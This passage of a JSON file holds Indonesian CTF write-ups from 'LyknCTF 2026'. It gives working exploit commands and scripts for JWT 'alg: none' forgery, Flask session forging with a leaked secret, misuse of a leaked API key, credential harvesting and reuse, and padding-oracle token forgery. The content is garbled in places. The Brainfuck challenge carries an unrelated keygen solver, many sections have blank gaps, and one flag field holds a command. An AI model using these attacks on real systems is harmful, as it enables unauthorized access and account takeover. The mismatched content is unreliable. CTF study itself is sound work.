    "problemDescription": "File challenge berisi 23.000 nama karakter yang dipisahkan spasi. Hanya ada tujuh token unik, jadi bentuknya cocok dengan Brainfuck tanpa instruksi output (`.`).\n\nSetelah token diterjemahkan, program membaca 34 byte. Sesudah setiap byte terdapat loop yang tidak pernah mengubah sel pengendalinya. Loop tersebut hanya bisa dilewati kalau hasil pemeriksaan byte saat itu sama dengan nol.\n\nSolver mencoba seluruh nilai `0x00` sampai `0xff` pada setiap posisi, menjalankan interpreter sampai loop jebakan berikutnya, lalu menyimpan satu-satunya kandidat yang membuat sel kontrol bernilai nol.",
    "tools": [],
    "analysis": "- pointer akhirnya kembali ke posisi awal; dan\n   - tidak pernah mengubah sel pada offset `0`.\n4. Jalankan program sampai instruksi input.\n5. Untuk posisi saat ini, coba seluruh byte `0..255`.\n6. Kandidat valid harus mencapai loop jebakan dengan nilai sel kontrol `0`.\n7. Lewati loop tersebut, simpan state tape, lalu lanjut ke input berikutnya.\n8. Pastikan selalu ada tepat satu kandidat pada setiap posisi dan program berakhir setelah byte ke-34.\n\nSel Brainfuck dimodelkan sebagai unsigned 8-bit, jadi operasi `+` dan `-` menggunakan wraparound modulo 256.",
    "solution": [
      {
        "title": "Pemetaan token",
        "content": "| Token | Brainfuck | Fungsi |\n|---|---:|---|\n| `usami_shohei` | `>` | Geser pointer ke kanan |\n| `natsusawa_saku` | `<` | Geser pointer ke kiri |\n| `waguri_kaoruko` | `+` | Tambah nilai sel |\n| `tsumugi_rintaro` | `-` | Kurangi nilai sel |\n| `yorita_ayato` | `[` | Awal loop |\n| `hoshina_subaru` | `]` | Akhir loop |\n| `kaoru_hana` | `,` | Baca satu byte input |\n\nPemetaan ini bisa diturunkan dari struktur token:\n\n- `yorita_ayato` dan `hoshina_subaru` masing-masing muncul 1.310 kali dan membentuk pasangan kurung yang valid.\n- `usami_shohei` dan `natsusawa_saku` masing-masing muncul 5.893 kali. Jumlah yang seimbang cocok dengan pergerakan pointer yang selalu kembali ke sel awal.\n- `kaoru_hana` muncul 34 kali dan selalu berada di batas antarblok pemeriksaan, sehingga jelas berperan sebagai input.\n- Dua token tersisa menjadi operasi `+` dan `-`. Orientasi di atas menghasilkan flag ASCII valid dan pola zeroing Brainfuck yang normal seperti `++[--]`."
      },
      {
        "title": "Loop jebakan",
        "content": "Ada tepat 34 loop yang tubuhnya kembali ke pointer awal tanpa menyentuh sel kontrol. Beberapa bentuknya:\n\n\n\nAmbil contoh `[>+[-]<]`:\n\n1. Pointer pindah ke kanan.\n2. Sel sementara dinaikkan lalu dikosongkan dengan `[-]`.\n3. Pointer kembali ke sel kontrol.\n4. Nilai sel kontrol tidak berubah.\n\nKalau sel kontrol bukan nol, kondisi `[` selalu benar dan loop berulang selamanya. Program hanya lanjut ketika hasil perhitungan sebelum loop tepat nol.\n\nPemeriksaan semacam ini muncul satu kali setelah masing-masing instruksi input. Artinya setiap karakter dapat dipulihkan secara berurutan tanpa menebak format flag.",
        "code": "[><]\n[>+[-]<]\n[>>+[-]<<]\n[>>>++[--]<<<]"
      },
      {
        "title": "Strategi solver",
        "content": "1. Ubah seluruh nama karakter menjadi source Brainfuck.\n2. Bangun jump table untuk seluruh pasangan `[` dan `]`."
      },
      {
        "title": "Menjalankan solver",
        "content": "Output akhirnya:",
        "code": "python3 solve.py 'output(5).txt'"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport hashlib\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nMASK32 = 0xFFFFFFFF\r\nRC4_KEY = b\"L0i_Y3u_Kh0_N0i\"\r\nUSERNAME_MASK = bytes.fromhex(\"add993f24ca678dc1d369f61e40236\")\r\nCIPHERTEXT_RVA = 0x6280\r\nCIPHERTEXT_SIZE = 0x60\r\nEXPECTED_CHECK_PREFIX = bytes.fromhex(\"7db51c69a8dd7926\")\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    value &= MASK32\r\n    return ((value << count) | (value >> (32 - count))) & MASK32\r\n\r\n\r\ndef rc4_ksa(key: bytes) -> list[int]:\r\n    state = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + state[i] + key[i % len(key)]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n    return state\r\n\r\n\r\ndef recover_username(state: list[int]) -> bytes:\r\n    selected = (0x42, 0x3D, 0x38, 0x33, 0x2E, 0x29, 0x24, 0x1F)\r\n    packed = 0\r\n    for index in selected:\r\n        packed = (packed << 8) | state[index]\r\n\r\n    username = bytearray(15)\r\n    packed ^= int.from_bytes(USERNAME_MASK[:8], \"little\")\r\n    username[:8] = packed.to_bytes(8, \"little\")\r\n\r\n    for position in range(8, 15):\r\n        table_index = 0x47 + 5 * (position - 8)\r\n        username[position] = USERNAME_MASK[position] ^ state[table_index]\r\n\r\n    return bytes(username)\r\n\r\n\r\ndef generate_license(username: bytes, state: list[int], anti_debug: int = 0) -> str:\r\n    r8 = ((anti_debug & 0xFF) * 0x01010101) ^ 0x4C594B4E\r\n    r9 = 0xAE054FB9\r\n    r11 = 0x43544632\r\n    accumulator = 0xA5A5F00D\r\n\r\n    for offset in (0, 7, 14):\r\n        for character in username:\r\n            table_value = state[(character + offset) & 0xFF]\r\n\r\n            mixed_r8 = rol32(r8 ^ table_value, 5)\r\n            mixed_r11 = rol32((table_value + r11) & MASK32, 11)\r\n            r8 = (mixed_r8 + r11) & MASK32\r\n\r\n            mixed_r9 = rol32(\r\n                ((table_value * 0x9E3779B1) & MASK32) ^ r9,\r\n                17,\r\n            )\r\n            r11 = mixed_r11 ^ r9\r\n            r9 = (mixed_r9 + accumulator) & MASK32\r\n\r\n            mixed_accumulator = rol32(\r\n                (state[r8 & 0xFF] + accumulator) & MASK32,\r\n                3,\r\n            )\r\n            accumulator = mixed_accumulator ^ r8\r\n\r\n    for _ in range(4):\r\n        r8 = (r8 + accumulator) & MASK32\r\n        r11 ^= rol32(r8, 7)\r\n        r9 = (r9 + r11) & MASK32\r\n        accumulator ^= rol32(r9, 13)\r\n\r\n    groups = [\r\n        (r8 >> 16) & 0xFFFF,\r\n        (r8 ^ r11) & 0xFFFF,\r\n        (r11 >> 16) & 0xFFFF,\r\n        (r9 ^ accumulator) & 0xFFFF,\r\n    ]\r\n    checksum = (\r\n        groups[0]\r\n        + groups[2]\r\n        + groups[1]\r\n        + groups[3]\r\n    ) ^ ((r9 >> 16) & 0xFFFF)\r\n    groups.append(checksum & 0xFFFF)\r\n\r\n    return \"-\".join(f\"{group:04X}\" for group in groups)\r\n\r\n\r\ndef parse_pe_sections(data: bytes) -> list[dict[str, int | str]]:\r\n    if data[:2] != b\"MZ\":\r\n        raise ValueError(\"input is not a PE file\")\r\n\r\n    pe_offset = struct.unpack_from(\"<I\", data, 0x3C)[0]\r\n    if data[pe_offset : pe_offset + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"invalid PE signature\")\r\n\r\n    number_of_sections = struct.unpack_from(\"<H\", data, pe_offset + 6)[0]\r\n    optional_header_size = struct.unpack_from(\"<H\", data, pe_offset + 20)[0]\r\n    section_table = pe_offset + 24 + optional_header_size\r\n\r\n    sections: list[dict[str, int | str]] = []\r\n    for index in range(number_of_sections):\r\n        offset = section_table + index * 40\r\n        name = data[offset : offset + 8].split(b\"\\0\", 1)[0].decode(\"ascii\")\r\n        virtual_size, virtual_address, raw_size, raw_offset = struct.unpack_from(\r\n            \"<IIII\", data, offset + 8\r\n        )\r\n        sections.append(\r\n            {\r\n                \"name\": name,\r\n                \"virtual_size\": virtual_size,\r\n                \"virtual_address\": virtual_address,\r\n                \"raw_size\": raw_size,\r\n                \"raw_offset\": raw_offset,\r\n            }\r\n        )\r\n    return sections\r\n\r\n\r\ndef section_by_name(sections: list[dict[str, int | str]], name: str) -> dict[str, int | str]:\r\n    for section in sections:\r\n        if section[\"name\"] == name:\r\n            return section\r\n    raise ValueError(f\"section {name!r} not found\")\r\n\r\n\r\ndef rva_to_offset(sections: list[dict[str, int | str]], rva: int) -> int:\r\n    for section in sections:\r\n        start = int(section[\"virtual_address\"])\r\n        span = max(int(section[\"virtual_size\"]), int(section[\"raw_size\"]))\r\n        if start <= rva < start + span:\r\n            return int(section[\"raw_offset\"]) + (rva - start)\r\n    raise ValueError(f\"RVA 0x{rva:x} is not mapped by a section\")\r\n\r\n\r\ndef loaded_section_bytes(data: bytes, section: dict[str, int | str]) -> bytes:\r\n    virtual_size = int(section[\"virtual_size\"])\r\n    raw_size = int(section[\"raw_size\"])\r\n    raw_offset = int(section[\"raw_offset\"])\r\n    raw = data[raw_offset : raw_offset + min(raw_size, virtual_size)]\r\n    return raw.ljust(virtual_size, b\"\\0\")\r\n\r\n\r\ndef decrypt_flag(executable: bytes, username: bytes, license_key: str, anti_debug: int = 0) -> bytes:\r\n    sections = parse_pe_sections(executable)\r\n    text = loaded_section_bytes(executable, section_by_name(sections, \".text\"))\r\n    text_digest = hashlib.sha256(text).digest()\r\n\r\n    master = hashlib.sha256(\r\n        username\r\n        + b\"\\x1f\"\r\n        + license_key.encode(\"ascii\")\r\n        + b\"\\x1f\"\r\n        + text_digest\r\n        + bytes([anti_debug & 0xFF])\r\n    ).digest()\r\n\r\n    keystream = b\"\".join(\r\n        hashlib.sha256(master + struct.pack(\"<I\", counter)).digest()\r\n        for counter in range(3)\r\n    )\r\n\r\n    ciphertext_offset = rva_to_offset(sections, CIPHERTEXT_RVA)\r\n    ciphertext = executable[\r\n        ciphertext_offset : ciphertext_offset + CIPHERTEXT_SIZE\r\n    ]\r\n    plaintext = bytes(left ^ right for left, right in zip(ciphertext, keystream))\r\n    flag = plaintext.split(b\"\\0\", 1)[0]\r\n\r\n    check = hashlib.sha256(b\"LYKN2026\" + flag).digest()\r\n    if check[:8] != EXPECTED_CHECK_PREFIX:\r\n        raise ValueError(\"decryption checksum did not match\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    path = Path(sys.argv[1] if len(sys.argv) > 1 else \"KeygenMe.exe\")\r\n    executable = path.read_bytes()\r\n\r\n    state = rc4_ksa(RC4_KEY)\r\n    username = recover_username(state)\r\n    license_key = generate_license(username, state, anti_debug=0)\r\n    flag = decrypt_flag(executable, username, license_key, anti_debug=0)\r\n\r\n    print(f\"[+] Username : {username.decode('ascii')}\")\r\n    print(f\"[+] License  : {license_key}\")\r\n    print(f\"[+] Flag     : {flag.decode('ascii')}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{K40RU_H4N4_W4_R1N_T0_S4KU}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-discordnitro",
    "title": "Discord Nitro",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Web  \n**Difficulty:** Easy  \n**Flag:** `LYKNCTF{4bc029f8d7f3494ca627f5985bc7de63}`",
    "problemDescription": "**CTF:** LYKNCTF 2026  \n**Category:** Web  \n**Difficulty:** Easy  \n**Flag:** `LYKNCTF{4bc029f8d7f3494ca627f5985bc7de63}`",
    "tools": [],
    "analysis": "### Vulnerability\n\nJWT parser menerima token dengan algoritma `none`. Algoritma tersebut menyatakan bahwa token tidak memiliki signature.\n\nKarena server tetap mempercayai payload token tanpa signature, nilai berikut dapat dibuat secara manual:\n\n```json\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n```\n\n```json\n{\n  \"user\": \"admin\",\n  \"role\": \"admin\"\n}\n```\n\nJWT akhirnya berbentuk:\n\n```text\nbase64url(header).base64url(payload).\n```\n\nTitik terakhir wajib ada sebagai bagian signature kosong.",
    "solution": [
      {
        "title": "> Free Discord Nitro",
        "content": "Target menyediakan akun demo `guest / guest`. Setelah login, aplikasi menyimpan identitas pengguna dalam cookie `token` berbentuk JWT. Halaman `/admin` hanya memeriksa nilai `role` dari token tersebut."
      },
      {
        "title": "Recon",
        "content": "Halaman awal menampilkan kredensial demo:\n\n\n\nLogin dilakukan dengan `POST /login`:\n\n\n\nCookie hasil login berisi JWT:\n\n\n\nHeader dan payload setelah di-decode:\n\n\n\n\n\nHalaman `/admin` menampilkan petunjuk bahwa cookie `token` menentukan identitas pengguna. Tidak ada validasi tambahan terhadap akun di sisi server.",
        "code": "guest / guest"
      },
      {
        "title": "Exploit",
        "content": "Token admin dibuat menggunakan Python lalu dikirim sebagai cookie ke `/admin`:\n\n\n\nServer menerima token tanpa signature dan memberikan akses admin:",
        "code": "BASE='http://385b1902-ea55-4d1b-8b75-dabbaddc58b1.51.79.140.18.nip.io:8080'\n\nTOKEN=$(python3 -c '\nimport json\nimport base64\n\nencode = lambda value: base64.urlsafe_b64encode(\n    json.dumps(value, separators=(\",\", \":\")).encode()\n).decode().rstrip(\"=\")\n\nprint(\n    encode({\"alg\": \"none\", \"typ\": \"JWT\"})\n    + \".\"\n    + encode({\"user\": \"admin\", \"role\": \"admin\"})\n    + \".\"\n)\n')\n\ncurl -sS \"$BASE/admin\" -H \"Cookie: token=$TOKEN\""
      },
      {
        "title": "Root Cause",
        "content": "Backend mengizinkan algoritma JWT ditentukan oleh header token dan menerima `alg: none`. Server seharusnya menetapkan algoritma yang diperbolehkan secara eksplisit, misalnya hanya `HS256`, lalu selalu memverifikasi signature sebelum membaca claim `role`."
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{4bc029f8d7f3494ca627f5985bc7de63}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-freebie",
    "title": "Freebie",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Freebie",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Category:** Web\n**Description:** `Human error is the weakest link.`"
      },
      {
        "title": "Reconnaissance",
        "content": "Aplikasi memiliki beberapa endpoint utama:\n\n\n\nUser biasa dapat melakukan registrasi dan login, tetapi saat membuka `/flag`, aplikasi menolak akses:\n\n\n\nLogin menggunakan username `admin` juga diblokir secara langsung:\n\n\n\nSetelah login sebagai user biasa, cookie session dapat didecode menggunakan `flask-unsign`:\n\n\n\nHasilnya hanya menyimpan username:\n\n\n\nIni menunjukkan bahwa aplikasi memakai Flask signed session dan akses admin kemungkinan ditentukan dari nilai `session['username']`.",
        "code": "/\n /login\n /register\n /flag"
      },
      {
        "title": "Fuzzing Parameter",
        "content": "Fuzzing direktori biasa hanya menemukan endpoint utama. Sesuai hint dari panitia, fuzzing kemudian diarahkan ke parameter query pada endpoint `/flag`.\n\nPertama, buat akun biasa dan simpan session cookie:\n\n\n\nKemudian fuzz nama parameter:\n\n\n\nDitemukan parameter menarik:",
        "code": "BASE='http://TARGET:8080'\nU=\"nata$(date +%s)\"\nP='Nata123!'\nJ=/tmp/freebie.cookie\n\ncurl -sS -o /dev/null -X POST \"$BASE/register\" \\\n  --data-urlencode \"username=$U\" \\\n  --data-urlencode \"password=$P\"\n\ncurl -sS -o /dev/null -c \"$J\" -X POST \"$BASE/login\" \\\n  --data-urlencode \"username=$U\" \\\n  --data-urlencode \"password=$P\""
      },
      {
        "title": "Source Code Disclosure",
        "content": "Mengakses endpoint berikut:\n\n\n\nmengembalikan seluruh source code aplikasi.\n\nBagian pentingnya:\n\n\n\nPenyebab source code bocor berasal dari middleware berikut:\n\n\n\nAplikasi hanya memeriksa apakah parameter `debug` ada di query string. Tidak ada autentikasi atau pembatasan akses.\n\nSource code juga menunjukkan logika akses flag:\n\n\n\nArtinya, kita hanya perlu membuat Flask session valid dengan isi:",
        "code": "curl -sS -b /tmp/freebie.cookie \"$BASE/flag?debug=admin\""
      },
      {
        "title": "Forging Flask Session",
        "content": "Karena `secret_key` sudah diketahui, session admin dapat ditandatangani menggunakan `flask-unsign`:\n\n\n\nGunakan cookie tersebut untuk mengakses `/flag`:\n\n\n\nServer memberikan akses sebagai admin:",
        "code": "C=$(flask-unsign \\\n  --sign \\\n  --cookie \"{'username':'admin'}\" \\\n  --secret 'sup3r_s3cr3t_ctf_k3y_727')"
      },
      {
        "title": "Root Cause",
        "content": "Challenge ini menggabungkan dua kerentanan:\n\n1. **Debug parameter exposed in production**\n\n   Parameter `debug` dapat digunakan siapa saja untuk membaca source code aplikasi.\n\n2. **Flask session secret disclosure**\n\n   Source code membocorkan `app.secret_key`, sehingga attacker dapat membuat signed session sendiri dan mengubah username menjadi `admin`."
      },
      {
        "title": "Exploit Ringkas",
        "content": "",
        "code": "BASE='http://TARGET:8080'\n\nSECRET=$(curl -sS \"$BASE/flag?debug=1\" |\n  grep -oP 'app\\.secret_key\\s*=\\s*\"\\K[^\"]+')\n\nCOOKIE=$(flask-unsign \\\n  --sign \\\n  --cookie \"{'username':'admin'}\" \\\n  --secret \"$SECRET\")\n\ncurl -sS \\\n  -H \"Cookie: session=$COOKIE\" \\\n  \"$BASE/flag\" |\n  grep -Eo 'LYKNCTF\\{[^}]+\\}'"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{51b5587b1444472bb403b8166234f846}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-goldhunters",
    "title": "Gold Hunters — Web CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Challenge:** Gold hunters\n**Kategori:** Web\n**Flag:** `LYKNCTF{40673f5a25ca4839996af5d6464df643}`",
    "problemDescription": "1. API key bocor di HTML halaman utama (`window.API_KEY`).\n2. Bundle JS hanya memakai `/api/contact`, tidak ada petunjuk endpoint lain di frontend.\n3. GET `/api/contact` butuh API key → konfirmasi key tadi valid untuk otorisasi.\n4. Data di endpoint contact bukan flag, jadi cari endpoint tersembunyi lain.\n5. `/docs` dan `/openapi.json` di root palsu (SPA catch-all), yang asli di bawah `/api/openapi.json`.\n6. Schema OpenAPI membocorkan endpoint `/api/get-flag` yang tidak dipanggil dari frontend manapun.\n7. Panggil endpoint tersebut dengan API key yang sama → flag didapat.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Buka halaman utama dengan curl:\n\n\n\nResponnya adalah halaman React (Vite build) biasa, tapi ada satu hal mencolok langsung di `<head>`:\n\n\n\nSebuah API key ditaruh langsung di HTML, bisa dibaca siapa saja lewat \"View Source\". Ini jelas petunjuk utama — \"gold di depan mata\" secara harfiah.",
        "code": "curl http://<host>:8080/"
      },
      {
        "title": "Membaca bundle JS",
        "content": "File JS di-load dari `/assets/index-B-T8Q2XM.js`. Di-download dan di-grep untuk endpoint API:\n\n\n\nHasil: hanya ada satu endpoint yang dipakai frontend, yaitu `/api/contact`. Kode React-nya ternyata form kontak sederhana (Chakra UI) yang POST ke endpoint ini. `window.API_KEY` yang bocor tadi tidak pernah dipakai di kode React manapun — jadi kemungkinan besar dia dipakai backend untuk endpoint tersembunyi yang tidak terhubung ke frontend.",
        "code": "curl -s http://<host>:8080/assets/index-B-T8Q2XM.js -o app.js\ngrep -oE '\"/api[^\"]*\"' app.js | sort -u"
      },
      {
        "title": "Menguji endpoint /api/contact",
        "content": "POST tanpa API key berhasil (201 Created), dan responnya mengembalikan `id` incremental. Karena id kita mulai dari 2 dan seterusnya, berarti sudah ada 1 baris data (`id=1`) sebelum kita mulai — kemungkinan data seed dari server.\n\nCoba GET ke endpoint yang sama:\n\n\n\nHasilnya `401 Unauthorized — \"Invalid or missing API key\"`. Ini mengonfirmasi bahwa API key yang bocor di HTML memang dipakai untuk otorisasi endpoint GET (baca data), bukan untuk POST.\n\nCoba lagi dengan header `x-api-key`:\n\n\n\nBerhasil, dapat list semua submission. Tapi isi `id=1` cuma data dummy (`name: a, message: hi`), bukan flag — jadi flag-nya bukan di data ini.",
        "code": "curl -X POST http://<host>:8080/api/contact \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"a\",\"email\":\"a@a.com\",\"message\":\"hi\"}'"
      },
      {
        "title": "Menemukan endpoint tersembunyi via OpenAPI schema",
        "content": "Karena backend-nya terlihat seperti FastAPI (format error validasi 422 khas Pydantic), FastAPI biasanya otomatis expose schema OpenAPI. Path `/docs` dan `/openapi.json` di root domain ternyata selalu mengembalikan HTML SPA yang sama dengan status 200 — ini karena frontend/server melakukan catch-all routing untuk semua path yang bukan `/api/*`, jadi status 200 di path-path itu menyesatkan (bukan indikasi endpoint asli).\n\nBackend asli hanya hidup di bawah prefix `/api/`. Maka openapi schema dicoba di:\n\n\n\nBerhasil, dan di dalam schema-nya ketemu path yang tidak pernah dipakai frontend:",
        "code": "curl http://<host>:8080/api/openapi.json -H \"x-api-key: nqU5HIqRq0azdNGXo3fOl9cb57iksZ9Wt4IMrIjdDW4\""
      },
      {
        "title": "Response:",
        "content": "",
        "code": "{\"flag\":\"LYKNCTF{40673f5a25ca4839996af5d6464df643}\"}"
      },
      {
        "title": "Root cause",
        "content": "- API key sensitif ditaruh di kode client-side (exposed by design/mistake).\n- Endpoint backend didaftarkan tanpa disembunyikan dari OpenAPI schema publik, sehingga endpoint \"rahasia\" tetap bisa ditemukan lewat introspeksi API standar FastAPI."
      }
    ],
    "terminalOutputs": [],
    "flag": "```\ncurl http://<host>:8080/api/get-flag -H \"x-api-key: nqU5HIqRq0azdNGXo3fOl9cb57iksZ9Wt4IMrIjdDW4\"",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-lykncorp",
    "title": "LYKN Corp",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup for challenge LYKN Corp",
    "problemDescription": "Portal mail LYKN punya direktori backup yang diblok lewat `/backup`, tapi nginx masih melayani path case-sensitive `/Backup/`. Directory listing di path itu membocorkan kredensial employee. Dari mailbox employee senior ditemukan kredensial admin, lalu halaman `/admin` menampilkan flag.\n\nFlag:\n\n```text\nLYKNCTF{03c01a433cef448a94e4f1b6d90122ce}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Target:",
        "content": "`robots.txt` memberi hint ke direktori backup:",
        "code": "http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080/"
      },
      {
        "title": "Output:",
        "content": "Path lowercase `/backup` diblok 403, tapi `/Backup/` bisa diakses karena rule nginx-nya tidak menutup variasi case tersebut.",
        "code": "User-agent: *\nDisallow: /backup"
      },
      {
        "title": "Output:",
        "content": "File `credentials.txt` berisi akun employee:",
        "code": "<a href=\"credentials.txt\">credentials.txt</a>"
      },
      {
        "title": "Output:",
        "content": "Login sebagai `tuan.nguyen` hanya memberi akses inbox employee biasa. Password onboarding yang sama ternyata juga valid untuk `minh.le`, user senior yang muncul sebagai pengirim email onboarding.\n\nMailbox `minh.le` punya email dari admin dengan kredensial service account:\n\n\n\nLogin sebagai admin mengarah ke `/admin` dan halaman tersebut menampilkan flag:",
        "code": "New Employee Credentials\n======================\nUsername: tuan.nguyen\nPassword: Welcome123!"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\n\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\n\r\n\r\nBASE = \"http://65352921-0b1b-42e3-8a49-6f7a1362b06a.51.79.140.18.nip.io:8080\"\r\n\r\n\r\ndef login(session: requests.Session, username: str, password: str) -> None:\r\n    response = session.post(\r\n        f\"{BASE}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if response.status_code != 302:\r\n        raise RuntimeError(f\"login failed for {username}: {response.status_code}\")\r\n\r\n\r\ndef main() -> None:\r\n    backup = requests.get(f\"{BASE}/Backup/credentials.txt\", timeout=10).text\r\n    employee_user = re.search(r\"Username: (.+)\", backup).group(1)\r\n    employee_pass = re.search(r\"Password: (.+)\", backup).group(1)\r\n\r\n    session = requests.Session()\r\n    login(session, employee_user, employee_pass)\r\n\r\n    senior = requests.Session()\r\n    login(senior, \"minh.le\", employee_pass)\r\n    mail = BeautifulSoup(senior.get(f\"{BASE}/email/2\", timeout=10).text, \"html.parser\").get_text(\"\\n\")\r\n    admin_user = re.search(r\"Username:\\s*(\\S+)\", mail).group(1)\r\n    admin_pass = re.search(r\"Password:\\s*(\\S+)\", mail).group(1)\r\n\r\n    admin = requests.Session()\r\n    login(admin, admin_user, admin_pass)\r\n    admin_page = admin.get(f\"{BASE}/admin\", timeout=10).text\r\n    flag = re.search(r\"LYKNCTF\\{[^}]+\\}\", admin_page).group(0)\r\n    print(f\"Admin page returned: Flag: {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{03c01a433cef448a94e4f1b6d90122ce}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-migration",
    "title": "Migrant",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Web  \n**CTF:** LYKNCTF 2026  \n**Target:** `http://dff994e4-0937-43b6-b739-4c269fddab25.51.79.140.18.nip.io:8080/`  \n**Flag:** `LYKNCTF{424b7d98da72494bb08e2645eb435e92}`",
    "problemDescription": "> The company currently changed their brand identity, and all staff must migrate their accounts to this new website. But... something is off with the transfer function.\n\nWebsite menyediakan token migrasi terenkripsi untuk akun guest:\n\n```text\n8FoFckHS2JB/2zBGtXpSCHSc4m8fAGkNrqdmeHieuem9/yW1NknM0TiWJvuQsRdQ/ymJM+zY35r6DEJOc+x1Fg==\n```\n\nToken dikirim ke endpoint berikut:\n\n```http\nPOST /api/migrate\nContent-Type: application/json\n\n{\"token\":\"...\"}\n```\n\nToken asli menghasilkan profil biasa:\n\n```json\n{\n  \"message\": \"Migration successful.\",\n  \"profile\": {\n    \"role\": \"user\",\n    \"user\": \"guest\",\n    \"v\": \"1.0\"\n  }\n}\n```\n\nTargetnya mengubah field `role` menjadi `admin` tanpa mengetahui key enkripsi.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Token Base64 didekode menjadi 64 byte:\n\n\n\nUkuran blok 16 byte dan total empat blok cocok dengan struktur AES-CBC:\n\n\n\nMengubah byte terakhir token selalu menghasilkan respons berbeda:\n\n\n\nServer membedakan ciphertext dengan padding valid dan padding tidak valid. Perbedaan respons ini membentuk **padding oracle**.",
        "code": "block 0: f05a057241d2d8907fdb3046b57a5208\nblock 1: 749ce26f1f00690daea76678789eb9e9\nblock 2: bdff25b53649ccd1389626fb90b11750\nblock 3: ff298933ecd8df9afa0c424e73ec7516"
      },
      {
        "title": "Padding Oracle",
        "content": "Untuk satu blok ciphertext `C`, plaintext dihitung sebagai:\n\n\n\nNilai `D(C)` disebut intermediate state. Intermediate state bisa dipulihkan byte per byte dengan memodifikasi blok sebelumnya dan mengamati apakah PKCS#7 padding diterima server.\n\nUntuk mencari byte terakhir, blok sebelumnya diubah sampai plaintext terakhir menjadi:\n\n\n\nSetelah byte terakhir ditemukan, dua byte terakhir dipaksa menjadi:\n\n\n\nProses yang sama dilanjutkan sampai seluruh 16 byte intermediate state diketahui.\n\nKarena oracle hanya memeriksa dua blok terakhir yang dikirim, payload probe dibuat seperti ini:\n\n\n\nDua blok nol di depan hanya menjaga format token tetap empat blok.",
        "code": "P = D(C) XOR Cprev"
      },
      {
        "title": "Mendekripsi Token",
        "content": "Intermediate state untuk `C1` dan `C2` dipulihkan dengan oracle, lalu plaintext dihitung:\n\n\n\nDua blok plaintext pertama yang ditemukan:\n\n\n\nPembagian per blok:",
        "code": "P1 = D(C1) XOR IV\nP2 = D(C2) XOR C1"
      },
      {
        "title": "Forge Role Admin",
        "content": "Mengganti `user` menjadi `admin` menambah satu byte. Panjang plaintext harus tetap sama agar struktur blok berikutnya tidak bergeser.\n\nPayload target dibuat menjadi:\n\n\n\nUsername dipendekkan satu byte dan satu spasi sebelum `role` dihapus. Total panjang dua blok tetap 32 byte.\n\nUntuk memaksa `P2` menjadi `P2'`, blok `C1` dimodifikasi:\n\n\n\nCBC bersifat malleable, jadi perubahan pada `C1` langsung mengubah plaintext blok kedua. Efek sampingnya, plaintext blok pertama ikut rusak karena `C1'` juga merupakan ciphertext yang didekripsi menjadi blok pertama.\n\nKerusakan blok pertama diperbaiki dengan:\n\n1. Memulihkan `D(C1')` menggunakan padding oracle.\n2. Menghitung IV baru agar plaintext blok pertama menjadi `P1'`.",
        "code": "P1' = b'{\"user\":\"gues\", '\nP2' = b'\"role\":\"admin\", '"
      },
      {
        "title": "Rumusnya:",
        "content": "Token final:\n\n\n\nHasil forge dalam Base64:",
        "code": "IV' = D(C1') XOR P1'"
      },
      {
        "title": "Hasil",
        "content": "Token hasil forge diterima sebagai akun admin:",
        "code": "{\n  \"flag\": \"LYKNCTF{424b7d98da72494bb08e2645eb435e92}\",\n  \"message\": \"Migration successful. Welcome back, Admin.\",\n  \"profile\": {\n    \"role\": \"admin\",\n    \"user\": \"gues\",\n    \"v\": \"1.0\"\n  }\n}"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{424b7d98da72494bb08e2645eb435e92}",
    "lessonsLearned": ""
  },
  {
